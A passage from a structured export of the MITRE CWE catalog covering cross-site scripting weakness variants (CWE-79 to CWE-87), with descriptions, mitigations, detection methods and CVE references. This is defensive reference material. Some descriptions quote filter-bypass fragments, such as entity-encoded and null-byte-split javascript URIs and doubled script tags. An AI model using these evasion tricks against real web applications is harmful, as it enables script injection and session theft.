XSS in a security product.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0971::REFERENCE:CVE-2008-5249:DESCRIPTION:Stored XSS using a wiki page.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5249::REFERENCE:CVE-2006-3568:DESCRIPTION:Stored XSS in a guestbook application.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-3568::REFERENCE:CVE-2006-3211:DESCRIPTION:Stored XSS in a guestbook application using a javascript: URI in a bbcode img tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-3211::REFERENCE:CVE-2006-3295:DESCRIPTION:Chain: library file is not protected against a direct request (CWE-425), leading to reflected XSS (CWE-79).:LINK:https://www.cve.org/CVERecord?id=CVE-2006-3295::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Cross-site scripting (XSS)::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Cross-site Scripting::TAXONOMY NAME:CLASP:ENTRY NAME:Cross-site scripting::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A1:ENTRY NAME:Cross Site Scripting (XSS):MAPPING FIT:Exact::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A1:ENTRY NAME:Unvalidated Input:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A4:ENTRY NAME:Cross-Site Scripting (XSS) Flaws:MAPPING FIT:Exact::TAXONOMY NAME:WASC:ENTRY ID:8:ENTRY NAME:Cross-site Scripting::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-79::\",::209::588::591::592::63::85::,\"::TYPE:Relationship:NOTE:There can be a close relationship between XSS and CSRF (CWE-352). An attacker might use CSRF in order to trick the victim into submitting requests to the server in which the requests contain an XSS payload. A well-known example of this was the Samy worm on MySpace [REF-956]. The worm used XSS to insert malicious HTML sequences into a user's profile and add the attacker as a MySpace friend. MySpace friends of that victim would then execute the payload to modify their own profiles, causing the worm to propagate exponentially. Since the victims did not intentionally insert the malicious script themselves, CSRF was a root cause.::TYPE:Applicable Platform:NOTE:XSS flaws are very common in web applications, since they require a great deal of developer discipline to avoid them.::\",\n80,\"Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)\",Variant,Incomplete,\"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters such as <, >, and & that could be interpreted as web-scripting elements when they are sent to a downstream component that processes web pages.\",\"This may allow such characters to be treated as control characters, which are executed client-side in the context of the user's session. Although this can be classified as an injection problem, the more pertinent issue is the improper conversion of such special characters to respective context-appropriate entities before displaying them to the user.\",::NATURE:ChildOf:CWE ID:79:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Read Application Data:IMPACT:Execute Unauthorized Code or Commands::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Carefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.::PHASE:Implementation:DESCRIPTION:With Struts, write all data from form beans with the bean's filter attribute set to true.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.:EFFECTIVENESS:Defense in Depth::\",\"::REFERENCE:CVE-2002-0938:DESCRIPTION:XSS in parameter in a link.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0938::REFERENCE:CVE-2002-1495:DESCRIPTION:XSS in web-based email product via attachment filenames.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1495::REFERENCE:CVE-2003-1136:DESCRIPTION:HTML injection in posted message.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1136::REFERENCE:CVE-2004-2171:DESCRIPTION:XSS not quoted in error page.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2171::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Basic XSS::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",::18::193::32::86::,\"\",\n81,\"Improper Neutralization of Script in an Error Message Web Page\",Variant,Incomplete,\"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters that could be interpreted as web-scripting elements when they are sent to an error page.\",\"Error pages may include customized 403 Forbidden or 404 Not Found pages. When an attacker can trigger an error that contains script syntax within the attacker's input, then cross-site scripting attacks may be possible.\",::NATURE:ChildOf:CWE ID:79:VIEW ID:1000:ORDINAL:Primary::NATURE:CanAlsoBe:CWE ID:209:VIEW ID:1000::NATURE:CanAlsoBe:CWE ID:390:VIEW ID:1000::,\"::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Read Application Data:IMPACT:Execute Unauthorized Code or Commands::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Do not write user-controlled input to error pages.::PHASE:Implementation:DESCRIPTION:Carefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.::PHASE:Implementation:DESCRIPTION:With Struts, write all data from form beans with the bean's filter attribute set to true.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.:EFFECTIVENESS:Defense in Depth::\",\"::REFERENCE:CVE-2002-0840:DESCRIPTION:XSS in default error page from Host: header.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0840::REFERENCE:CVE-2002-1053:DESCRIPTION:XSS in error message.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1053::REFERENCE:CVE-2002-1700:DESCRIPTION:XSS in error page from targeted parameter.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1700::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:XSS in error pages::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",::198::,\"\",\n82,\"Improper Neutralization of Script in Attributes of IMG Tags in a Web Page\",Variant,Incomplete,\"The web application does not neutralize or incorrectly neutralizes scripting elements within attributes of HTML IMG tags, such as the src attribute.\",\"Attackers can embed XSS exploits into the values for IMG attributes (e.g. SRC) that is streamed and then executed in a victim's browser. Note that when the page is loaded into a user's browsers, the exploit will automatically execute.\",::NATURE:ChildOf:CWE ID:83:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Read Application Data:IMPACT:Execute Unauthorized Code or Commands::\",\"\",\"::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.:EFFECTIVENESS:Defense in Depth::\",\"::REFERENCE:CVE-2006-3211:DESCRIPTION:Stored XSS in a guestbook application using a javascript: URI in a bbcode img tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-3211::REFERENCE:CVE-2002-1649:DESCRIPTION:javascript URI scheme in IMG tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1649::REFERENCE:CVE-2002-1803:DESCRIPTION:javascript URI scheme in IMG tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1803::REFERENCE:CVE-2002-1804:DESCRIPTION:javascript URI scheme in IMG tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1804::REFERENCE:CVE-2002-1805:DESCRIPTION:javascript URI scheme in IMG tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1805::REFERENCE:CVE-2002-1806:DESCRIPTION:javascript URI scheme in IMG tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1806::REFERENCE:CVE-2002-1807:DESCRIPTION:javascript URI scheme in IMG tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1807::REFERENCE:CVE-2002-1808:DESCRIPTION:javascript URI scheme in IMG tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1808::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Script in IMG tags::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",,\"\",\n83,\"Improper Neutralization of Script in Attributes in a Web Page\",Variant,Draft,\"The product does not neutralize or incorrectly neutralizes javascript: or other URIs from dangerous attributes within tags, such as onmouseover, onload, onerror, or style.\",\"\",::NATURE:ChildOf:CWE ID:79:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Read Application Data:IMPACT:Execute Unauthorized Code or Commands::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Carefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.::PHASE:Implementation:DESCRIPTION:With Struts, write all data from form beans with the bean's filter attribute set to true.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.:EFFECTIVENESS:Defense in Depth::\",\"::REFERENCE:CVE-2001-0520:DESCRIPTION:Bypass filtering of SCRIPT tags using onload in BODY, href in A, BUTTON, INPUT, and others.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0520::REFERENCE:CVE-2002-1493:DESCRIPTION:guestbook XSS in STYLE or IMG SRC attributes.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1493::REFERENCE:CVE-2002-1965:DESCRIPTION:Javascript in onerror attribute of IMG tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1965::REFERENCE:CVE-2002-1495:DESCRIPTION:XSS in web-based email product via onmouseover event.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1495::REFERENCE:CVE-2002-1681:DESCRIPTION:XSS via script in <P> tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1681::REFERENCE:CVE-2004-1935:DESCRIPTION:Onload, onmouseover, and other events in an e-mail attachment.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1935::REFERENCE:CVE-2005-0945:DESCRIPTION:Onmouseover and onload events in img, link, and mail tags.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0945::REFERENCE:CVE-2003-1136:DESCRIPTION:Javascript in onmouseover attribute in e-mail address or URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1136::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:XSS using Script in Attributes::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",::243::244::588::,\"\",\n84,\"Improper Neutralization of Encoded URI Schemes in a Web Page\",Variant,Draft,\"The web application improperly neutralizes user-controlled input for executable script disguised with URI encodings.\",\"\",::NATURE:ChildOf:CWE ID:79:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Unexpected State::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Resolve all URIs to absolute or canonical representations before processing.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Carefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.::PHASE:Implementation:DESCRIPTION:With Struts, write all data from form beans with the bean's filter attribute set to true.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.:EFFECTIVENESS:Defense in Depth::\",\"::REFERENCE:CVE-2005-0563:DESCRIPTION:Cross-site scripting (XSS) vulnerability in Microsoft Outlook Web Access (OWA) component in Exchange Server 5.5 allows remote attackers to inject arbitrary web script or HTML via an email message with an encoded javascript: URL (jav&#X41sc&#0010;ript:) in an IMG tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0563::REFERENCE:CVE-2005-2276:DESCRIPTION:Cross-site scripting (XSS) vulnerability in Novell Groupwise WebAccess 6.5 before July 11, 2005 allows remote attackers to inject arbitrary web script or HTML via an e-mail message with an encoded javascript URI (e.g. j&#X41vascript in an IMG tag).:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2276::REFERENCE:CVE-2005-0692:DESCRIPTION:Encoded script within BBcode IMG tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0692::REFERENCE:CVE-2002-0117:DESCRIPTION:Encoded javascript in IMG tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0117::REFERENCE:CVE-2002-0118:DESCRIPTION:Encoded javascript in IMG tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0118::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:XSS using Script Via Encoded URI Schemes::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",,\"\",\n85,\"Doubled Character XSS Manipulations\",Variant,Draft,\"The web application does not filter user-controlled input for executable script disguised using doubling of the involved characters.\",\"\",::NATURE:ChildOf:CWE ID:79:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:675:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Read Application Data:IMPACT:Execute Unauthorized Code or Commands::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Resolve all filtered input to absolute or canonical representations before processing.::PHASE:Implementation:DESCRIPTION:Carefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.::PHASE:Implementation:DESCRIPTION:With Struts, write all data from form beans with the bean's filter attribute set to true.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.:EFFECTIVENESS:Defense in Depth::\",\"::REFERENCE:CVE-2002-2086:DESCRIPTION:XSS using <script.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2086::REFERENCE:CVE-2000-0116:DESCRIPTION:Encoded javascript in IMG tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0116::REFERENCE:CVE-2001-1157:DESCRIPTION:Extra < in front of SCRIPT tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1157::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:DOUBLE - Doubled character XSS manipulations, e.g. <script::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",::245::,\"\",\n86,\"Improper Neutralization of Invalid Characters in Identifiers in Web Pages\",Variant,Draft,\"The product does not neutralize or incorrectly neutralizes invalid characters or byte sequences in the middle of tag names, URI schemes, and other identifiers.\",\"Some web browsers may remove these sequences, resulting in output that may have unintended control implications. For example, the product may attempt to remove a javascript: URI scheme, but a java%00script: URI may bypass this check and still be rendered as active javascript by some browsers, allowing XSS or other attacks.\",::NATURE:ChildOf:CWE ID:79:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:184:VIEW ID:1000::NATURE:ChildOf:CWE ID:436:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Read Application Data:IMPACT:Execute Unauthorized Code or Commands::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.:EFFECTIVENESS:Defense in Depth::\",\"::REFERENCE:CVE-2004-0595:DESCRIPTION:XSS filter doesn't filter null characters before looking for dangerous tags, which are ignored by web browsers. Multiple Interpretation Error (MIE) and validate-before-cleanse.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0595::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Invalid Characters in Identifiers::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",::247::73::85::,\"\",\n87,\"Improper Neutralization of Alternate XSS Syntax\",Variant,Draft,\"The product does not neutralize or incorrectly neutralizes user-controlled input for alternate script syntax.\",\"\",::NATURE:ChildOf:CWE ID:79:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Read Application Data:IMPACT:Execute Unauthorized Code or Commands::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Resolve all input to absolute or canonical representations before processing.::PHASE:Implementation:DESCRIPTION:Carefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.::PHASE:Implementation:DESCRIPTION:With Struts, write all data from form beans with the bean's filter attribute set to true.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.:EFFECTIVENESS:Defense in Depth::\",\"::REFERENCE:CVE-2002-0738:DESCRIPTION:XSS using &={script}.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0738::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Alternate XSS syntax::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",::199::,\"\","
  },
  "doc-327b5d9d17c4ae3107b404a80bd67409": {
